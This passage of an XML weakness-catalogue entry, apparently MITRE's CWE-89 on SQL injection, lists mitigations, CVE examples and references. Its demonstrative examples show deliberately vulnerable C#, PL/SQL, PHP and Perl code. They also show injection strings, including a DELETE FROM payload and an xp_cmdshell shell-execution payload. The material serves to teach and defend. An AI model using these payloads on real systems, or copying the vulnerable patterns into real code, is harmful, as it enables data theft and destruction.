               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-4">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
                  <Text>For example, consider using persistence layers such as Hibernate or
							Enterprise Java Beans, which can provide significant protection against
							SQL injection if used properly.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-27">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Parameterization</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>If available, use structured mechanisms that automatically enforce the
							separation between data and code. These mechanisms may be able to
							provide the relevant quoting, encoding, and validation automatically,
							instead of relying on the developer to provide this capability at every
							point where output is generated.</Text>
                  <Text>Process SQL queries using prepared statements, parameterized queries,
							or stored procedures. These features should accept parameters or
							variables and support strong typing. Do not dynamically construct and
							execute query strings within these features using "exec" or similar
							functionality, since this may re-introduce the possibility of SQL
							injection. [R.89.3]</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-17">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Run your code using the lowest privileges that are required to
							accomplish the necessary tasks [R.89.12]. If possible, create isolated
							accounts with limited privileges that are only used for a single task.
							That way, a successful attack will not immediately give the attacker
							access to the rest of the software or its environment. For example,
							database applications rarely need to run as the database administrator,
							especially in day-to-day operations.</Text>
                  <Text>Specifically, follow the principle of least privilege when creating
							user accounts to a SQL database. The database users should only have the
							minimum privileges necessary to use their account. If the requirements
							of the system indicate that a user can read and modify their own data,
							then limit their privileges so they cannot read/write others' data. Use
							the strictest permissions possible on all database objects, such as
							execute-only for stored procedures.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-15">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>For any security checks that are performed on the client side, ensure
							that these checks are duplicated on the server side, in order to avoid
							CWE-602. Attackers can bypass the client-side checks by modifying values
							after the checks have been performed, or by changing the client to
							remove the client-side checks entirely. Then, these modified values
							would be submitted to the server.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-28">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Output Encoding</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>While it is risky to use dynamically-generated query strings, code, or
							commands that mix control and data together, sometimes it may be
							unavoidable. Properly quote arguments and escape any special characters
							within those arguments. The most conservative approach is to escape or
							filter all characters that do not pass an extremely strict whitelist
							(such as everything that is not alphanumeric or white space). If some
							special characters are still needed, such as white space, wrap each
							argument in quotes after the escaping/filtering step. Be careful of
							argument injection (CWE-88).</Text>
                  <Text>Instead of building a new implementation, such features may be
							available in the database or programming language. For example, the
							Oracle DBMS_ASSERT package can check or enforce that parameters have
							certain properties that make them less vulnerable to SQL injection. For
							MySQL, the mysql_real_escape_string() API function is available in both
							C and PHP.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-5">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Input Validation</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Assume all input is malicious. Use an "accept known good" input
							validation strategy, i.e., use a whitelist of acceptable inputs that
							strictly conform to specifications. Reject any input that does not
							strictly conform to specifications, or transform it into something that
							does.</Text>
                  <Text>When performing input validation, consider all potentially relevant
							properties, including length, type of input, the full range of
							acceptable values, missing or extra inputs, syntax, consistency across
							related fields, and conformance to business rules. As an example of
							business rule logic, "boat" may be syntactically valid because it only
							contains alphanumeric characters, but it is not valid if the input is
							only expected to contain colors such as "red" or "blue."</Text>
                  <Text>Do not rely exclusively on looking for malicious or malformed inputs
							(i.e., do not rely on a blacklist). A blacklist is likely to miss at
							least one undesirable input, especially if the code's environment
							changes. This can give attackers enough room to bypass the intended
							validation. However, blacklists can be useful for detecting potential
							attacks or determining which inputs are so malformed that they should be
							rejected outright.</Text>
                  <Text>When constructing SQL query strings, use stringent whitelists that
							limit the character set based on the expected value of the parameter in
							the request. This will indirectly limit the scope of an attack, but this
							technique is less important than proper output encoding and
							escaping.</Text>
                  <Text>Note that proper output encoding, escaping, and quoting is the most
							effective solution for preventing SQL injection, although input
							validation may provide some defense-in-depth. This is because it
							effectively limits what will appear in output. Input validation will not
							always prevent SQL injection, especially if you are required to support
							free-form text fields that could contain arbitrary characters. For
							example, the name "O'Reilly" would likely pass the validation step,
							since it is a common last name in the English language. However, it
							cannot be directly inserted into the database because it contains the
							"'" apostrophe character, which would need to be escaped or otherwise
							handled. In this case, stripping the apostrophe might reduce the risk of
							SQL injection, but it would produce incorrect behavior because the wrong
							name would be recorded.</Text>
                  <Text>When feasible, it may be safest to disallow meta-characters entirely,
							instead of escaping them. This will provide some defense in depth. After
							the data is entered into the database, later processes may neglect to
							escape meta-characters before use, and you may not have control over
							those processes.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-21">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Enforcement by Conversion</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>When the set of acceptable objects, such as filenames or URLs, is
							limited or known, create a mapping from a set of fixed input values
							(such as numeric IDs) to the actual filenames or URLs, and reject all
							other inputs.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-39">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Ensure that error messages only contain minimal details that are
							useful to the intended audience, and nobody else. The messages need to
							strike the balance between being too cryptic and not being cryptic
							enough. They should not necessarily reveal the methods that were used to
							determine the error. Such detailed information can be used to refine the
							original attack to increase the chances of success.</Text>
                  <Text>If errors must be tracked in some detail, capture them in log messages
							- but consider what could occur if the log messages can be viewed by
							attackers. Avoid recording highly sensitive information such as
							passwords in any form. Avoid inconsistent messaging that might
							accidentally tip off an attacker about internal state, such as whether a
							username is valid or not.</Text>
                  <Text>In the context of SQL Injection, error messages revealing the
							structure of a SQL query can help attackers tailor successful attack
							strings.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-29">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Strategy>Firewall</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use an application firewall that can detect attacks against this
							weakness. It can be beneficial in cases in which the code cannot be
							fixed (because it is controlled by a third party), as an emergency
							prevention measure while more comprehensive software assurance measures
							are applied, or to provide defense in depth.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Moderate</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>An application firewall might not cover all possible input vectors. In
							addition, attack techniques might be available to bypass the protection
							mechanism, such as using malformed inputs that can still be processed by
							the component that receives those inputs. Depending on functionality, an
							application firewall might inadvertently reject or modify legitimate
							requests. Finally, some manual effort may be required for
							customization.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-16">
               <Mitigation_Phase>Operation</Mitigation_Phase>
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Strategy>Environment Hardening</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>When using PHP, configure the application so that it does not use
							register_globals. During implementation, develop the application so that
							it does not rely on this feature, but be wary of implementing a
							register_globals emulation that is subject to weaknesses such as CWE-95,
							CWE-621, and similar issues.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>In 2008, a large number of web servers were compromised using the
						same SQL injection attack string. This single string worked against many
						different programs. The SQL injection was then used to modify the web sites
						to serve malicious code. [1]</Intro_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>The following code dynamically constructs and executes a SQL query
						that searches for items matching a specified name. The query restricts the
						items displayed to those where owner matches the user name of the
						currently-authenticated user.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C#</Code_Example_Language>
                     <Code>...</Code>
                     <Code>string userName = ctx.getAuthenticatedUserName();</Code>
                     <Code>string query = "SELECT * FROM items WHERE owner = '" + userName +
								"' AND itemname = '" + ItemName.Text + "'";</Code>
                     <Code>sda = new SqlDataAdapter(query, conn);</Code>
                     <Code>DataTable dt = new DataTable();</Code>
                     <Code>sda.Fill(dt);</Code>
                     <Code>...</Code>
                  </Block>
                  <Text>The query that this code intends to execute follows:</Text>
                  <Block>
                     <Code>SELECT * FROM items WHERE owner = &lt;userName&gt; AND
								itemname = &lt;itemName&gt;;</Code>
                  </Block>
                  <Text>However, because the query is constructed dynamically by concatenating
							a constant base query string and a user input string, the query only
							behaves correctly if itemName does not contain a single-quote character.
							If an attacker with the user name wiley enters the string:</Text>
                  <Block Block_Nature="Attack">
                     <Code>name' OR 'a'='a</Code>
                  </Block>
                  <Text>for itemName, then the query becomes the following:</Text>
                  <Block Block_Nature="Attack">
                     <Code>SELECT * FROM items WHERE owner = 'wiley' AND itemname = 'name' OR
								'a'='a';</Code>
                  </Block>
                  <Text>The addition of the:</Text>
                  <Block Block_Nature="Attack">
                     <Code>OR 'a'='a</Code>
                  </Block>
                  <Text>condition causes the WHERE clause to always evaluate to true, so the
							query becomes logically equivalent to the much simpler query:</Text>
                  <Block Block_Nature="Attack">
                     <Code>SELECT * FROM items;</Code>
                  </Block>
                  <Text>This simplification of the query allows the attacker to bypass the
							requirement that the query only return items owned by the authenticated
							user; the query now returns all entries stored in the items table,
							regardless of their specified owner.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example examines the effects of a different malicious value
						passed to the query constructed and executed in the previous
						example.</Intro_Text>
               <Example_Body>
                  <Text>If an attacker with the user name wiley enters the string:</Text>
                  <Block Block_Nature="Attack">
                     <Code>name'; DELETE FROM items; --</Code>
                  </Block>
                  <Text>for itemName, then the query becomes the following two queries:</Text>
                  <Block Block_Nature="Attack">
                     <Code_Example_Language>SQL</Code_Example_Language>
                     <Code>SELECT * FROM items WHERE owner = 'wiley' AND itemname =
								'name';</Code>
                     <Code>DELETE FROM items;</Code>
                     <Comment>--'</Comment>
                  </Block>
                  <Text>Many database servers, including Microsoft(R) SQL Server 2000, allow
							multiple SQL statements separated by semicolons to be executed at once.
							While this attack string results in an error on Oracle and other
							database servers that do not allow the batch-execution of statements
							separated by semicolons, on databases that do allow batch execution,
							this type of attack allows the attacker to execute arbitrary commands
							against the database.</Text>
                  <Text>Notice the trailing pair of hyphens (--), which specifies to most
							database servers that the remainder of the statement is to be treated as
							a comment and not executed. In this case the comment character serves to
							remove the trailing single-quote left over from the modified query. On a
							database where comments are not allowed to be used in this way, the
							general attack could still be made effective using a trick similar to
							the one shown in the previous example.</Text>
                  <Text>If an attacker enters the string</Text>
                  <Block Block_Nature="Attack">
                     <Code>name'; DELETE FROM items; SELECT * FROM items WHERE 'a'='a</Code>
                  </Block>
                  <Text>Then the following three valid statements will be created:</Text>
                  <Block Block_Nature="Attack">
                     <Code>SELECT * FROM items WHERE owner = 'wiley' AND itemname =
								'name';</Code>
                     <Code>DELETE FROM items;</Code>
                     <Code>SELECT * FROM items WHERE 'a'='a';</Code>
                  </Block>
                  <Text>One traditional approach to preventing SQL injection attacks is to
							handle them as an input validation problem and either accept only
							characters from a whitelist of safe values or identify and escape a
							blacklist of potentially malicious values. Whitelisting can be a very
							effective means of enforcing strict input validation rules, but
							parameterized SQL statements require less maintenance and can offer more
							guarantees with respect to security. As is almost always the case,
							blacklisting is riddled with loopholes that make it ineffective at
							preventing SQL injection attacks. For example, attackers can:</Text>
                  <Block Block_Nature="List">
                     <Text>Target fields that are not quoted</Text>
                     <Text>Find ways to bypass the need for certain escaped
								meta-characters</Text>
                     <Text>Use stored procedures to hide the injected meta-characters.
							</Text>
                  </Block>
                  <Text>Manually escaping characters in input to SQL queries can help, but it
							will not make your application secure from SQL injection attacks.</Text>
                  <Text>Another solution commonly proposed for dealing with SQL injection
							attacks is to use stored procedures. Although stored procedures prevent
							some types of SQL injection attacks, they do not protect against many
							others. For example, the following PL/SQL procedure is vulnerable to the
							same SQL injection attack shown in the first example.</Text>
                  <Block Block_Nature="Bad_Code">
                     <Code>procedure get_item ( itm_cv IN OUT ItmCurTyp, usr in varchar2, itm
								in varchar2)</Code>
                     <Code>is open itm_cv for</Code>
                     <Code>' SELECT * FROM items WHERE ' || 'owner = '|| usr || ' AND
								itemname = ' || itm || ';</Code>
                     <Code>end get_item;</Code>
                  </Block>
                  <Text>Stored procedures typically help prevent SQL injection attacks by
							limiting the types of statements that can be passed to their parameters.
							However, there are many ways around the limitations and many interesting
							statements that can still be passed to stored procedures. Again, stored
							procedures can prevent some exploits, but they will not make your
							application secure against SQL injection attacks.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>MS SQL has a built in function that enables shell command execution.
						An SQL injection in such a context could be disastrous. For example, a query
						of the form:</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code>SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='$user_input'
								ORDER BY PRICE</Code>
                  </Block>
                  <Text>Where $user_input is taken from an untrusted source.</Text>
                  <Text>If the user provides the string:</Text>
                  <Block Block_Nature="Attack">
                     <Code>'; exec master..xp_cmdshell 'dir' --</Code>
                  </Block>
                  <Text>The query will take the following form:</Text>
                  <Block Block_Nature="Attack">
                     <Code>SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=''; exec
								master..xp_cmdshell 'dir' --' ORDER BY PRICE</Code>
                  </Block>
                  <Text>Now, this query can be broken down into:</Text>
                  <Block Block_Nature="Numeric_List">
                     <Text>a first SQL query: SELECT ITEM,PRICE FROM PRODUCT WHERE
								ITEM_CATEGORY='';</Text>
                     <Text>a second SQL query, which executes the dir command in the shell:
								exec master..xp_cmdshell 'dir'</Text>
                     <Text>an MS SQL comment: --' ORDER BY PRICE</Text>
                  </Block>
                  <Text>As can be seen, the malicious input changes the semantics of the query
							into a query, a shell command execution and a comment.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This code intends to print a message summary given the message
						ID.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code>$id = $_COOKIE["mid"];</Code>
                     <Code>mysql_query("SELECT MessageID, Subject FROM messages WHERE
								MessageID = '$id'");</Code>
                  </Block>
                  <Text>The programmer may have skipped any input validation on $id under the
							assumption that attackers cannot modify the cookie. However, this is
							easy to do with custom client code or even in the web browser.</Text>
                  <Text>While $id is wrapped in single quotes in the call to mysql_query(), an
							attacker could simply change the incoming mid cookie to:</Text>
                  <Block Block_Nature="Attack">
                     <Code>1432' or '1' = '1</Code>
                  </Block>
                  <Text>This would produce the resulting query:</Text>
                  <Block Block_Nature="Result">
                     <Code>SELECT MessageID, Subject FROM messages WHERE MessageID = '1432'
								or '1' = '1'</Code>
                  </Block>
                  <Text>Not only will this retrieve message number 1432, it will retrieve all
							other messages.</Text>
                  <Text>In this case, the programmer could apply a simple modification to the
							code to eliminate the SQL injection:</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code>$id = intval($_COOKIE["mid"]);</Code>
                     <Code>mysql_query("SELECT MessageID, Subject FROM messages WHERE
								MessageID = '$id'");</Code>
                  </Block>
                  <Text>However, if this code is intended to support multiple users with
							different message boxes, the code might also need an access control
							check (CWE-285) to ensure that the application user has the permission
							to see that message.</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>This example attempts to take a last name provided by a user and
						enter it into a database.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Perl</Code_Example_Language>
                     <Code>$userKey = getUserID();</Code>
                     <Code>$name = getUserInput();</Code>
                     <Comment># ensure only letters, hyphens and apostrophe are
								allowed</Comment>
                     <Code>$name = whiteList($name, "^a-zA-z'-$");</Code>
                     <Code>$query = "INSERT INTO last_names VALUES('$userKey',
								'$name')";</Code>
                  </Block>
                  <Text>While the programmer applies a whitelist to the user input, it has
							shortcomings. First of all, the user is still allowed to provide hyphens
							which are used as comment structures in SQL. If a user specifies -- then
							the remainder of the statement will be treated as a comment, which may
							bypass security logic. Furthermore, the whitelist permits the apostrophe
							which is also a data / command separator in SQL. If a user supplies a
							name with an apostrophe, they may be able to alter the structure of the
							whole statement and even change control flow of the program, possibly
							accessing or modifying confidential information. In this situation, both
							the hyphen and apostrophe are legitimate characters for a last name and
							permitting them is required. Instead, a programmer may want to use a
							prepared statement or apply an encoding routine to the input to prevent
							any data / directive misinterpretations.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2004-0366</Observed_Example_Reference>
               <Observed_Example_Description>chain: SQL injection in library intended for
						database authentication allows SQL injection and authentication bypass.
					</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-2790</Observed_Example_Reference>
               <Observed_Example_Description>SQL injection through an ID that was supposed to
						be numeric.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-2223</Observed_Example_Reference>
               <Observed_Example_Description>SQL injection through an ID that was supposed to
						be numeric.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-6602</Observed_Example_Reference>
               <Observed_Example_Description>SQL injection via user
						name.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-5817</Observed_Example_Reference>
               <Observed_Example_Description>SQL injection via user name or password
						fields.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2003-0377</Observed_Example_Reference>
               <Observed_Example_Description>SQL injection in security product, using a crafted
						group name.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-2380</Observed_Example_Reference>
               <Observed_Example_Description>SQL injection in authentication
						library.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.89.1">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 1: SQL Injection." Page 3</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.89.2">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 12, "Database Input Issues" Page
						397</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Local_Reference_ID="R.89.3">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>SQL Injection Prevention Cheat Sheet</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/SQL_Injection_Prevention_Cheat_Sheet</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.89.4">
               <Reference_Author>Steven Friedl</Reference_Author>
               <Reference_Title>SQL Injection Attacks by Example</Reference_Title>
               <Reference_Date>2007-10-10</Reference_Date>
               <Reference_Link>http://www.unixwiz.net/techtips/sql-injection.html</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.89.5">
               <Reference_Author>Ferruh Mavituna</Reference_Author>
               <Reference_Title>SQL Injection Cheat Sheet</Reference_Title>
               <Reference_Date>2007-03-15</Reference_Date>
               <Reference_Link>http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.89.6">
               <Reference_Author>David Litchfield</Reference_Author>
               <Reference_Author>Chris Anley</Reference_Author>
               <Reference_Author>John Heasman</Reference_Author>
               <Reference_Author>Bill Grindlay</Reference_Author>
               <Reference_Title>The Database Hacker's Handbook: Defending Database
						Servers</Reference_Title>
               <Reference_Publisher>Wiley</Reference_Publisher>
               <Reference_Date>2005-07-14</Reference_Date>
            </Reference>
            <Reference Local_Reference_ID="R.89.7">
               <Reference_Author>David Litchfield</Reference_Author>
               <Reference_Title>The Oracle Hacker's Handbook: Hacking and Defending
						Oracle</Reference_Title>
               <Reference_Publisher>Wiley</Reference_Publisher>
               <Reference_Date>2007-01-30</Reference_Date>
            </Reference>
            <Reference Local_Reference_ID="R.89.8">
               <Reference_Author>Microsoft</Reference_Author>
               <Reference_Title>SQL Injection</Reference_Title>
               <Reference_PubDate>December 2008</Reference_PubDate>
               <Reference_Link>http://msdn.microsoft.com/en-us/library/ms161953.aspx</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.89.9">
               <Reference_Author>Microsoft Security Vulnerability Research &amp;
						Defense</Reference_Author>
               <Reference_Title>SQL Injection Attack</Reference_Title>
               <Reference_Link>http://blogs.technet.com/swi/archive/2008/05/29/sql-injection-attack.aspx</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.89.10">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Title>Giving SQL Injection the Respect it Deserves</Reference_Title>
               <Reference_Date>2008-05-15</Reference_Date>
               <Reference_Link>http://blogs.msdn.com/sdl/archive/2008/05/15/giving-sql-injection-the-respect-it-deserves.aspx</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.89.11">
               <Reference_Author>Frank Kim</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 2 - SQL Injection</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-01</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/03/01/top-25-series-rank-2-sql-injection/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-31" Local_Reference_ID="R.89.12">
               <Reference_Author>Sean Barnum</Reference_Author>
               <Reference_Author>Michael Gegick</Reference_Author>
               <Reference_Title>Least Privilege</Reference_Title>
               <Reference_PubDate>2005-09-14</Reference_PubDate>
               <Reference_Link>https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/351.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.89.13">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 8, "SQL Queries", Page 431.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-7">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 17, "SQL Injection", Page 1061.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>SQL injection</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="7 Pernicious Kingdoms">
               <Mapped_Node_Name>SQL Injection</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CLASP">
               <Mapped_Node_Name>SQL injection</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2007">
               <Mapped_Node_Name>Injection Flaws</Mapped_Node_Name>
               <Mapped_Node_ID>A2</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2004">
               <Mapped_Node_Name>Unvalidated Input</Mapped_Node_Name>
               <Mapped_Node_ID>A1</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2004">
               <Mapped_Node_Name>Injection Flaws</Mapped_Node_Name>
               <Mapped_Node_ID>A6</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="WASC">
               <Mapped_Node_Name>SQL Injection </Mapped_Node_Name>
               <Mapped_Node_ID>19</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="Software Fault Patterns">
               <Mapped_Node_Name>Tainted input to command</Mapped_Node_Name>
               <Mapped_Node_ID>SFP24</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <White_Box_Definitions>
            <White_Box_Definition>
               <Text>A weakness where the code path has:</Text>
               <Block>
                  <Text>1. start statement that accepts input and</Text>
                  <Text>2. end statement that performs an SQL command where</Text>
                  <Block>
                     <Text>a. the input is part of the SQL command and</Text>
                     <Text>b. input contains SQL syntax (esp. query separator)</Text>
                  </Block>
               </Block>
            </White_Box_Definition>
         </White_Box_Definitions>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>108</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>109</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>110</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>470</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>66</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>7</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>7 Pernicious Kingdoms</Submitter>
            </Submission>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>CLASP</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier_Organization>KDM Analytics</Modifier_Organization>
               <Modification_Date>2008-08-01</Modification_Date>
               <Modification_Comment>added/updated white box definitions</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier_Organization>Veracode</Modifier_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004
						mapping</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences,
						Modes_of_Introduction, Name, Relationships, Other_Notes, Relationship_Notes,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description,
						Enabling_Factors_for_Exploitation, Modes_of_Introduction, Name,
						Observed_Examples, Other_Notes, Potential_Mitigations, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
